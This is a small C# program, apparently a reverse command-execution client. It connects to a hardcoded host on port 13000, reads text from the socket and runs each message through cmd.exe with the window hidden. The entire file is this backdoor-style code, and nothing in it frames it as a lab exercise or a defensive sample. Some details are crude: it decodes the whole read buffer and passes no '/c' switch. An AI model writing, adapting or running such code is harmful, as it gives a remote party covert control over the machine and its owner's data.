using System;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;

namespace TCPClient
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int port = 13000;
            IPAddress server = IPAddress.Parse("192.168.1.172");
            getMessage(server, ref port);
            Console.ReadLine();
        }

        static void getMessage(IPAddress server, ref int port)
        {
            try
            {
                TcpClient client = new TcpClient(server.ToString(), port);

                NetworkStream stream = client.GetStream();
                byte[] bytes = new byte[256];
                string response = string.Empty;
                
                while (stream.Read(bytes, 0, bytes.Length) != 0)
                {
                    response = System.Text.Encoding.UTF8.GetString(bytes);

                    Process process = new Process();
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.Arguments = response;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();

                    Console.WriteLine("Executed command: " + response);
                }
            } catch(Exception e)
            {
                Console.Error.WriteLine(e.Message);
            }
        }
    }
}